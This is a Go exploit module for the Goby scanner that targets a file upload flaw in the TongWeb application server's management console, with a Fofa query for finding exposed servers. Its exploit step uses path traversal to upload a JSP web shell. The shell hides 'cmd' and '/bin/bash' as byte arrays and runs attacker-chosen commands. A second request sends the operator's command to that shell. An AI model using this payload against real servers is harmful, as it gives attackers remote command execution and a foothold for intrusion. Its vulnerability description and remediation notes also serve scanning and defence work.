package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "Tongweb Upload interface has file upload vulnerability",
    "Description": "<p>TongWeb is an application server from Beijing Dongfang Tong Technology Co., LTD.</p><p>The TongWeb management console of Beijing Dongfang Technology Co., LTD has a file upload vulnerability, which can be used by attackers to obtain server permissions.</p>",
    "Product": "Tong web",
    "Homepage": "http://www.tongtech.com/",
    "DisclosureDate": "2022-09-06",
    "Author": "lvyyevd",
    "FofaQuery": "banner=\"Server: TongWeb Server\" || header=\"Server: TongWeb Server\"",
    "GobyQuery": "banner=\"Server: TongWeb Server\" || header=\"Server: TongWeb Server\"",
    "Level": "3",
    "Impact": "<p>TongWeb management console has a file upload vulnerability, the attacker can use the vulnerability to obtain the server permission,</p>",
    "Recommendation": "<p>Add permission verification to this excuse to filter the uploaded file names in the blacklist and whitelist.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/heimdall/deploy/upload?method=upload",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"file\"; filename=\"../../applications/console/css/12462332j12.jsp\"\r\n\r\n <%\n out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));\n new java.io.File(application.getRealPath(request.getServletPath())).delete();\n %>\r\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/console/css/12462332j12.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/heimdall/deploy/upload?method=upload",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundary8UaANmWAgM4BqBSs\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../applications/console/css/index_usds.jsp\"\r\n\r\n<%@ page pageEncoding=\"utf-8\"%>\n<%@ page import=\"java.util.Scanner\" %>\n<HTML>\n<BODY>\n<FORM METHOD=\"POST\" NAME=\"form\" ACTION=\"#\">\n    <INPUT TYPE=\"text\" NAME=\"q\">\n    <INPUT TYPE=\"submit\" VALUE=\"exec\">\n</FORM>\n\n<%\n    String op=\"ttttt\";\n    String query = request.getParameter(\"q\");\n    String fileSeparator = String.valueOf(java.io.File.separatorChar);\n    Boolean isWin;\n    if(fileSeparator.equals(\"\\\\\")){\n        isWin = true;\n    }else{\n        isWin = false;\n    }\n\n    if (query != null) {\n        ProcessBuilder pb;\n        if(isWin) {\n            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);\n        }else{\n            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);\n        }\n        Process process = pb.start();\n        Scanner sc = new Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");\n        op = sc.hasNext() ? sc.next() : op;\n        sc.close();\n    }\n%>\n\n<PRE>\n    <%= op %>>\n</PRE>\n</BODY>\n</HTML>\r\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/console/css/index_usds.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "q={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<PRE>([\\s\\S]*)</PRE>"
            ]
        }
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Tongweb upload 接口存在文件上传漏洞",
            "Product": "东方通-TongWeb",
            "Description": "<p>TongWeb 是北京东方通科技股份有限公司的一款应用服务器。</p><p>北京东方通科技股份有限公司 TongWeb 管理控制台存在文件上传漏洞，攻击者可利用该漏洞获取服务器权限。&nbsp;</p>",
            "Recommendation": "<p>1、对此接口加上权限校验</p><p>2、对上传文件名进行黑白名单过滤。</p><p>3、联系官方进行产品修复 <a href=\"https://www.tongtech.com/\">https://www.tongtech.com/</a></p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">TongWeb管理控制台存在文件上传漏洞，攻击者可利用该漏洞获取服务器权限，</span><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "Tongweb Upload interface has file upload vulnerability",
            "Product": "Tong web",
            "Description": "<p>TongWeb is an application server from Beijing Dongfang Tong Technology Co., LTD.</p><p>The TongWeb management console of Beijing Dongfang Technology Co., LTD has a file upload vulnerability, which can be used by attackers to obtain server permissions.</p>",
            "Recommendation": "<p>Add permission verification to this excuse to filter the uploaded file names in the blacklist and whitelist.<br></p>",
            "Impact": "<p>TongWeb management console has a file upload vulnerability, the attacker can use the vulnerability to obtain the server permission,<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}